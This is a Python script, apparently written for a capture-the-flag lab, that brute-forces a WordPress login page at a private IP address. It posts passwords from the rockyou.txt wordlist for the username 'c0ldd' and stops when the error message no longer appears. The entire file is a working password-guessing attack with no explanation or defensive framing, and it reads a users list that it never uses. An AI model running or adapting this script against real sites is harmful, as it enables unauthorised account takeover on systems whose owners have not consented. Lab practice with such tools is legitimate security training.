#!/usr/bin/python3

import requests
import sys

i = 0

cookies = {
	'wordpress_test_cookie': "WP+Cookie+check"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://10.10.65.212/wp-login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.10.65.212',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

def login(password):
	data = {
	  'log': 'c0ldd',
	  'pwd': password,
	  'wp-submit': 'Log In',
	  'redirect_to': '/wp-admin/',
	  'testcookie': '1'
	}

	response = requests.post('http://10.10.65.212/wp-login.php', data=data, cookies=cookies, headers=headers)
	if "The password you entered for the username" not in response.text:
		print("Password Found: " + str(password))
		sys.exit()
	
users = [ x.strip() for x in open('users.txt', 'r') if x ]
passwords = [ x.strip() for x in open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') if x ]

for password in passwords:
	i += 1
	print("Trying Credentials#" + str(i) + ": " + str(password))
	login(password)
